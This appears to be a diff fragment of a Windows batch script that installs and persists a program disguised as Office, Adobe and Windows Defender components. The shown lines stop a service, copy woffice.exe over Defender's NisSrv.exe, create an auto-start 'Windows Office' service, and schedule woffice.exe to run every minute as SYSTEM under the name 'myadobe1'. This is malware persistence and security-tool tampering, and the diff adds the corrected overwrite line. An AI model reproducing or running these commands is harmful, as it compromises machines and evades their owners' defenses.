@@ -75,7 +75,7 @@ SLEEP 10
 taskkill /f /im wup.exe
 net stop wup
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
-copy /y %windir%\woffice.exe 'C:\Program Files\Windows Defender\NisSrv.exe'
+copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
 sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
 net start wup
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
